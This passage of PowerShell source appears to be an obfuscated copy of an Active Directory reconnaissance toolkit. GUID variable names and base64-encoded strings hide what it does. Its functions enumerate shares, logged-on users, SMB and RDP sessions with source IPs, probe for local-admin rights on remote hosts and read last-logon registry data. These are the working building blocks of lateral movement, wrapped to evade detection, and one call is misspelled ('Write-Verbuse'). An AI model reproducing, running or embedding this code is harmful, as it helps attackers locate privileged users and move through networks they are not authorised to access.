                                ${b12c15582cce43a4ab90d2f8e2ab306a} = ${90aa09aa19244112b72f8e1a37891707}.subString(${90aa09aa19244112b72f8e1a37891707}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                if ($_.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                                    ${54a514691a304263a5e1f4b75679c082} = $True
                                }
                                else {
                                    ${54a514691a304263a5e1f4b75679c082} = $False
                                }
                                if ($_.samAccountName) {
                                    ${a93a7a3a61c64d07a2f6770952369f81} = $_.samAccountName
                                }
                                else {
                                    try {
                                        try {
                                            ${a93a7a3a61c64d07a2f6770952369f81} = Convert-SidToName $_.cn
                                        }
                                        catch {
                                            ${a93a7a3a61c64d07a2f6770952369f81} = $_.cn
                                        }
                                    }
                                    catch {
                                        Write-Debug "Error resolving SID : $_"
                                    }
                                }
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) "${b12c15582cce43a4ab90d2f8e2ab306a}/${a93a7a3a61c64d07a2f6770952369f81}"
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) $_.objectsid
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) $False
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${54a514691a304263a5e1f4b75679c082}
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                                ${9e7297d2e2074245a7bf5f660c80498f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBpAG4A'))) ''
                                ${9e7297d2e2074245a7bf5f660c80498f}
                            }
                        }
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}
function Get-NetShare {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        ${0baab04e222c4f25a46cff8e8d5b0671} = 1
        ${fdeede9eefe5471a976279791dc83df3} = [IntPtr]::Zero
        ${a5b68277561f47bfad38079bed53021a} = 0
        ${0d41d3f9b63c4bd383a91af0edb93c20} = 0
        ${51712317f46b43569de2e2813375a9bd} = 0
        ${934af845da6e4eb0a5370de6d7b8da04} = ${347508e7d5c343c383791764772da8a2}::NetShareEnum(${c096522c7bbe4c7aaadf99843e3b09fb}, ${0baab04e222c4f25a46cff8e8d5b0671}, [ref]${fdeede9eefe5471a976279791dc83df3}, -1, [ref]${a5b68277561f47bfad38079bed53021a}, [ref]${0d41d3f9b63c4bd383a91af0edb93c20}, [ref]${51712317f46b43569de2e2813375a9bd})
        ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${fdeede9eefe5471a976279791dc83df3}.ToInt64()
        Write-Debug "Get-NetShare result: ${934af845da6e4eb0a5370de6d7b8da04}"
        if ((${934af845da6e4eb0a5370de6d7b8da04} -eq 0) -and (${d0da59b7ae0a4835a7cd2c7ff056c201} -gt 0)) {
            ${4d910ce627c64154aeccd8018ce7b36a} = ${d2201d74fe814b0bb1668bd20c885f62}::GetSize()
            for (${df57982c23a24d73a2eb69bf47d8ac30} = 0; (${df57982c23a24d73a2eb69bf47d8ac30} -lt ${a5b68277561f47bfad38079bed53021a}); ${df57982c23a24d73a2eb69bf47d8ac30}++) {
                ${f283df36c8b6459eb77e2af1c1ca0da7} = New-Object System.Intptr -ArgumentList ${d0da59b7ae0a4835a7cd2c7ff056c201}
                ${f0129f1f16df446696bafc2b7fa7256f} = ${f283df36c8b6459eb77e2af1c1ca0da7} -as ${d2201d74fe814b0bb1668bd20c885f62}
                ${f0129f1f16df446696bafc2b7fa7256f} | select *
                ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${f283df36c8b6459eb77e2af1c1ca0da7}.ToInt64()
                ${d0da59b7ae0a4835a7cd2c7ff056c201} += ${4d910ce627c64154aeccd8018ce7b36a}
            }
            $Null = ${347508e7d5c343c383791764772da8a2}::NetApiBufferFree(${fdeede9eefe5471a976279791dc83df3})
        }
        else
        {
            switch (${934af845da6e4eb0a5370de6d7b8da04}) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function Get-NetLoggedon {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        ${0baab04e222c4f25a46cff8e8d5b0671} = 1
        ${fdeede9eefe5471a976279791dc83df3} = [IntPtr]::Zero
        ${a5b68277561f47bfad38079bed53021a} = 0
        ${0d41d3f9b63c4bd383a91af0edb93c20} = 0
        ${51712317f46b43569de2e2813375a9bd} = 0
        ${934af845da6e4eb0a5370de6d7b8da04} = ${347508e7d5c343c383791764772da8a2}::NetWkstaUserEnum(${c096522c7bbe4c7aaadf99843e3b09fb}, ${0baab04e222c4f25a46cff8e8d5b0671}, [ref]${fdeede9eefe5471a976279791dc83df3}, -1, [ref]${a5b68277561f47bfad38079bed53021a}, [ref]${0d41d3f9b63c4bd383a91af0edb93c20}, [ref]${51712317f46b43569de2e2813375a9bd})
        ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${fdeede9eefe5471a976279791dc83df3}.ToInt64()
        Write-Debug "Get-NetLoggedon result: ${934af845da6e4eb0a5370de6d7b8da04}"
        if ((${934af845da6e4eb0a5370de6d7b8da04} -eq 0) -and (${d0da59b7ae0a4835a7cd2c7ff056c201} -gt 0)) {
            ${4d910ce627c64154aeccd8018ce7b36a} = ${31e19233316045ec9bab727e09cad639}::GetSize()
            for (${df57982c23a24d73a2eb69bf47d8ac30} = 0; (${df57982c23a24d73a2eb69bf47d8ac30} -lt ${a5b68277561f47bfad38079bed53021a}); ${df57982c23a24d73a2eb69bf47d8ac30}++) {
                ${f283df36c8b6459eb77e2af1c1ca0da7} = New-Object System.Intptr -ArgumentList ${d0da59b7ae0a4835a7cd2c7ff056c201}
                ${f0129f1f16df446696bafc2b7fa7256f} = ${f283df36c8b6459eb77e2af1c1ca0da7} -as ${31e19233316045ec9bab727e09cad639}
                ${f0129f1f16df446696bafc2b7fa7256f} | select *
                ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${f283df36c8b6459eb77e2af1c1ca0da7}.ToInt64()
                ${d0da59b7ae0a4835a7cd2c7ff056c201} += ${4d910ce627c64154aeccd8018ce7b36a}
            }
            $Null = ${347508e7d5c343c383791764772da8a2}::NetApiBufferFree(${fdeede9eefe5471a976279791dc83df3})
        }
        else
        {
            switch (${934af845da6e4eb0a5370de6d7b8da04}) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function Get-NetSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost',
        [String]
        ${dfa85e24773f431f91e73de068d7b94e} = ''
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        ${0baab04e222c4f25a46cff8e8d5b0671} = 10
        ${fdeede9eefe5471a976279791dc83df3} = [IntPtr]::Zero
        ${a5b68277561f47bfad38079bed53021a} = 0
        ${0d41d3f9b63c4bd383a91af0edb93c20} = 0
        ${51712317f46b43569de2e2813375a9bd} = 0
        ${934af845da6e4eb0a5370de6d7b8da04} = ${347508e7d5c343c383791764772da8a2}::NetSessionEnum(${c096522c7bbe4c7aaadf99843e3b09fb}, '', ${dfa85e24773f431f91e73de068d7b94e}, ${0baab04e222c4f25a46cff8e8d5b0671}, [ref]${fdeede9eefe5471a976279791dc83df3}, -1, [ref]${a5b68277561f47bfad38079bed53021a}, [ref]${0d41d3f9b63c4bd383a91af0edb93c20}, [ref]${51712317f46b43569de2e2813375a9bd})
        ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${fdeede9eefe5471a976279791dc83df3}.ToInt64()
        Write-Debug "Get-NetSession result: ${934af845da6e4eb0a5370de6d7b8da04}"
        if ((${934af845da6e4eb0a5370de6d7b8da04} -eq 0) -and (${d0da59b7ae0a4835a7cd2c7ff056c201} -gt 0)) {
            ${4d910ce627c64154aeccd8018ce7b36a} = ${217be0a6c77e460590ed09c0e660df50}::GetSize()
            for (${df57982c23a24d73a2eb69bf47d8ac30} = 0; (${df57982c23a24d73a2eb69bf47d8ac30} -lt ${a5b68277561f47bfad38079bed53021a}); ${df57982c23a24d73a2eb69bf47d8ac30}++) {
                ${f283df36c8b6459eb77e2af1c1ca0da7} = New-Object System.Intptr -ArgumentList ${d0da59b7ae0a4835a7cd2c7ff056c201}
                ${f0129f1f16df446696bafc2b7fa7256f} = ${f283df36c8b6459eb77e2af1c1ca0da7} -as ${217be0a6c77e460590ed09c0e660df50}
                ${f0129f1f16df446696bafc2b7fa7256f} | select *
                ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${f283df36c8b6459eb77e2af1c1ca0da7}.ToInt64()
                ${d0da59b7ae0a4835a7cd2c7ff056c201} += ${4d910ce627c64154aeccd8018ce7b36a}
            }
            $Null = ${347508e7d5c343c383791764772da8a2}::NetApiBufferFree(${fdeede9eefe5471a976279791dc83df3})
        }
        else
        {
            switch (${934af845da6e4eb0a5370de6d7b8da04}) {
                (5)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB1AHMAZQByACAAZABvAGUAcwAgAG4AbwB0ACAAaABhAHYAZQAgAGEAYwBjAGUAcwBzACAAdABvACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))}
                (124)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAB2AGEAbAB1AGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGYAbwByACAAdABoAGUAIABsAGUAdgBlAGwAIABwAGEAcgBhAG0AZQB0AGUAcgAgAGkAcwAgAG4AbwB0ACAAdgBhAGwAaQBkAC4A')))}
                (87)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAHAAYQByAGEAbQBlAHQAZQByACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (234)         {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAGUAbgB0AHIAaQBlAHMAIABhAHIAZQAgAGEAdgBhAGkAbABhAGIAbABlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQAgAGwAYQByAGcAZQAgAGUAbgBvAHUAZwBoACAAYgB1AGYAZgBlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAYQBsAGwAIABlAG4AdAByAGkAZQBzAC4A')))}
                (8)           {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdQBmAGYAaQBjAGkAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGkAcwAgAGEAdgBhAGkAbABhAGIAbABlAC4A')))}
                (2312)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHMAZQBzAHMAaQBvAG4AIABkAG8AZQBzACAAbgBvAHQAIABlAHgAaQBzAHQAIAB3AGkAdABoACAAdABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlAC4A')))}
                (2351)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAG8AbQBwAHUAdABlAHIAIABuAGEAbQBlACAAaQBzACAAbgBvAHQAIAB2AGEAbABpAGQALgA=')))}
                (2221)        {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlACAAbgBvAHQAIABmAG8AdQBuAGQALgA=')))}
                (53)          {Write-Debug $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABmAG8AdQBuAGQA')))}
            }
        }
    }
}
function Get-NetRDPSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        ${ac5993f77ea3429581880329e84fca9c} = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSOpenServerEx(${c096522c7bbe4c7aaadf99843e3b09fb})
        if (${ac5993f77ea3429581880329e84fca9c} -ne 0) {
            Write-Debug "WTSOpenServerEx handle: ${ac5993f77ea3429581880329e84fca9c}"
            ${b3f72d37597a43f29e807b7f892dcd17} = [IntPtr]::Zero
            ${9907a4bdae114781ba809bd48815d5ac} = 0
            ${934af845da6e4eb0a5370de6d7b8da04} = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSEnumerateSessionsEx(${ac5993f77ea3429581880329e84fca9c}, [ref]1, 0, [ref]${b3f72d37597a43f29e807b7f892dcd17}, [ref]${9907a4bdae114781ba809bd48815d5ac})
            ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${b3f72d37597a43f29e807b7f892dcd17}.ToInt64()
            Write-Debug "WTSEnumerateSessionsEx result: ${934af845da6e4eb0a5370de6d7b8da04}"
            Write-Debug "pCount: ${9907a4bdae114781ba809bd48815d5ac}"
            if ((${934af845da6e4eb0a5370de6d7b8da04} -ne 0) -and (${d0da59b7ae0a4835a7cd2c7ff056c201} -gt 0)) {
                ${4d910ce627c64154aeccd8018ce7b36a} = ${0802e30f56674260a76187dd4fa2c517}::GetSize()
                for (${df57982c23a24d73a2eb69bf47d8ac30} = 0; (${df57982c23a24d73a2eb69bf47d8ac30} -lt ${9907a4bdae114781ba809bd48815d5ac}); ${df57982c23a24d73a2eb69bf47d8ac30}++) {
                    ${f283df36c8b6459eb77e2af1c1ca0da7} = New-Object System.Intptr -ArgumentList ${d0da59b7ae0a4835a7cd2c7ff056c201}
                    ${f0129f1f16df446696bafc2b7fa7256f} = ${f283df36c8b6459eb77e2af1c1ca0da7} -as ${0802e30f56674260a76187dd4fa2c517}
                    ${0b6fa33768804a82b31b7b851c2623b1} = New-Object PSObject
                    if (${f0129f1f16df446696bafc2b7fa7256f}.pHostName) {
                        ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${f0129f1f16df446696bafc2b7fa7256f}.pHostName
                    }
                    else {
                        ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${c096522c7bbe4c7aaadf99843e3b09fb}
                    }
                    ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${f0129f1f16df446696bafc2b7fa7256f}.pSessionName
                    if ($(-not ${f0129f1f16df446696bafc2b7fa7256f}.pDomainName) -or (${f0129f1f16df446696bafc2b7fa7256f}.pDomainName -eq '')) {
                        ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${f0129f1f16df446696bafc2b7fa7256f}.pUserName)"
                    }
                    else {
                        ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${f0129f1f16df446696bafc2b7fa7256f}.pDomainName)\$(${f0129f1f16df446696bafc2b7fa7256f}.pUserName)"
                    }
                    ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty 'ID' ${f0129f1f16df446696bafc2b7fa7256f}.SessionID
                    ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${f0129f1f16df446696bafc2b7fa7256f}.State
                    ${869af5f5aa1d45e8b6330d152dd6498f} = [IntPtr]::Zero
                    ${6d1636f1284443368ad462b8e6a0a4ac} = 0
                    ${941b1b0d9934430ea67c060143b1a726} = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSQuerySessionInformation(${ac5993f77ea3429581880329e84fca9c}, ${f0129f1f16df446696bafc2b7fa7256f}.SessionID, 14, [ref]${869af5f5aa1d45e8b6330d152dd6498f}, [ref]${6d1636f1284443368ad462b8e6a0a4ac})
                    ${60a79cd3f7ac4ade9369cafbad9c645a} = ${869af5f5aa1d45e8b6330d152dd6498f}.ToInt64()
                    ${10171cb8f0fb4ddb9120dfbadbfd7e7a} = New-Object System.Intptr -ArgumentList ${60a79cd3f7ac4ade9369cafbad9c645a}
                    ${28544b6006854cc8a16950962ae29ce6} = ${10171cb8f0fb4ddb9120dfbadbfd7e7a} -as ${72ea8f033c674ad89200bae4ac1f7707}
                    ${2f2faff270ba4a5385050a57daadf7dc} = ${28544b6006854cc8a16950962ae29ce6}.Address       
                    if(${2f2faff270ba4a5385050a57daadf7dc}[2] -ne 0) {
                        ${2f2faff270ba4a5385050a57daadf7dc} = [String]${2f2faff270ba4a5385050a57daadf7dc}[2]+"."+[String]${2f2faff270ba4a5385050a57daadf7dc}[3]+"."+[String]${2f2faff270ba4a5385050a57daadf7dc}[4]+"."+[String]${2f2faff270ba4a5385050a57daadf7dc}[5]
                    }
                    else {
                        ${2f2faff270ba4a5385050a57daadf7dc} = $Null
                    }
                    ${0b6fa33768804a82b31b7b851c2623b1} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${2f2faff270ba4a5385050a57daadf7dc}
                    ${0b6fa33768804a82b31b7b851c2623b1}
                    $Null = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSFreeMemory(${869af5f5aa1d45e8b6330d152dd6498f})
                    ${d0da59b7ae0a4835a7cd2c7ff056c201} += ${4d910ce627c64154aeccd8018ce7b36a}
                }
                $Null = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSFreeMemoryEx(2, ${b3f72d37597a43f29e807b7f892dcd17}, ${9907a4bdae114781ba809bd48815d5ac})
            }
            $Null = ${26471c1a6bfd4d5db4c768a1e130c4bf}::WTSCloseServer(${ac5993f77ea3429581880329e84fca9c})
        }
        else {
            ${db0b38b007ad44fca8b1e4b8ad97955f} = ${d9976c8cc3cf4fc89c0415702057a193}::GetLastError()
            Write-Verbuse "LastError: ${db0b38b007ad44fca8b1e4b8ad97955f}"
        }
    }
}
function Invoke-CheckLocalAdminAccess {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost'
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
    }
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        ${ac5993f77ea3429581880329e84fca9c} = ${7e1510d25785470fa1ce4b91dbf94262}::OpenSCManagerW("\\${c096522c7bbe4c7aaadf99843e3b09fb}", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F)
        Write-Debug "Invoke-CheckLocalAdminAccess handle: ${ac5993f77ea3429581880329e84fca9c}"
        if (${ac5993f77ea3429581880329e84fca9c} -ne 0) {
            $Null = ${7e1510d25785470fa1ce4b91dbf94262}::CloseServiceHandle(${ac5993f77ea3429581880329e84fca9c})
            $True
        }
        else {
            ${db0b38b007ad44fca8b1e4b8ad97955f} = ${d9976c8cc3cf4fc89c0415702057a193}::GetLastError()
            Write-Debug "Invoke-CheckLocalAdminAccess LastError: ${db0b38b007ad44fca8b1e4b8ad97955f}"
            $False
        }
    }
}
function Get-LastLoggedOn {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        ${c096522c7bbe4c7aaadf99843e3b09fb} = "."
    )
    process {
        ${c096522c7bbe4c7aaadf99843e3b09fb} = Get-NameField -b2929ecf6cd74a84bce9ccd2f5622fbb ${c096522c7bbe4c7aaadf99843e3b09fb}
        try {
            ${43d13ff79b6143e7838149d02f176464} = [WMIClass]"\\${c096522c7bbe4c7aaadf99843e3b09fb}\root\default:stdRegProv"
            ${fbcc9dfbc75b4d7c94acd3ef424a6e96} = 2147483650
            ${5d6afadd83614764a6d3f69fb67ac9ee} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQA=')))
